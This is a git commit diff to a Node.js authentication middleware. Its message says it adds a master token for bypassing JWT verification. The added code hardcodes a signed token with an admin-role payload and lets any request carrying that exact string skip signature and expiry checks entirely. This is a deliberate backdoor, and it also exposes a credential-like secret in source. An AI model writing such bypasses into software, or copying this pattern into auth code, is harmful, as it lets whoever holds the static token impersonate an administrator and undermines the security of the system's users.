6cb6a935f2f9d0aa78293b1d6f304b87b6f453cd
lucland <lucas.vsc@gmail.com>
2023-12-19 18:07:52 -0300

    Add master token for bypassing JWT verification

--- src/middleware/auth.js
+++ src/middleware/auth.js
@@ -4,12 +4,18 @@ const User = require('../models/User');
 const Supervisor = require('../models/Supervisor');
 
 const SECRET_KEY = process.env.SECRET_KEY;
+const MASTER_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Imx1Y2FzdmNhcm5laXJvIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjk5MzAwMTYxLCJleHAiOjE2OTk0NzI5NjF9.QytPS1faAJDDHVb9VuMRLeHXzBzb9ME_HGNThSpe1Lc"; // Hardcoded token
 
 const authenticateJWT = async (req, res, next) => {
   const authHeader = req.headers.authorization;
 
   if (authHeader) {
     const token = authHeader.split(' ')[1]; // Split "Bearer YOUR_JWT_TOKEN"
+
+    if (token === MASTER_TOKEN) {
+      next(); // Bypass JWT verification and proceed
+      return;
+    }
 
     try {
       const decoded = jwt.verify(token, SECRET_KEY);
